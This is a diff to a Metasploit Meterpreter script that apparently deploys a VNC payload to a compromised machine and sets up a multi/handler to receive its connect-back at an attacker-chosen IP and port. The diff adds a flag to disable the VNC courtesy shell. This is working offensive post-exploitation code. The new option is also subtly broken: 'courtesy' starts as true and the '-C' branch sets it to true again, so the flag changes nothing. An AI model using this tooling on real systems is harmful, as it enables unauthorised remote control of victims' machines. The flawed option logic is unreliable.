@@ -13,7 +13,8 @@ opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "This help menu"],
 	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4545)"],
-	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"]
+	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
+	"-C"  => [ false,  "Disable the VNC courtesy shell"]
 )
 
 #
@@ -23,6 +24,7 @@ opts = Rex::Parser::Arguments.new(
 rhost    = Rex::Socket.source_address("1.2.3.4")
 rport    = 4545
 autoconn = true
+courtesy = true
 
 #
 # Option parsing
@@ -38,6 +40,8 @@ opts.parse(args) do |opt, idx, val|
 		rport = val.to_i
 	when "-D"
 		autoconn = false
+	when "-C"
+		courtesy = true
 	end
 end
 
@@ -79,7 +83,9 @@ if(autoconn)
 	mul.datastore['LPORT']     = rport
 	mul.datastore['EXITFUNC']  = 'process'
 	mul.datastore['ExitOnSession'] = true
-
+	if (courtesy)
+		mul.datastore['DisableCourtesyShell'] = true
+	end
 	mul.exploit_simple(
 		'Payload'        => mul.datastore['PAYLOAD'],
 		'RunAsJob'       => true
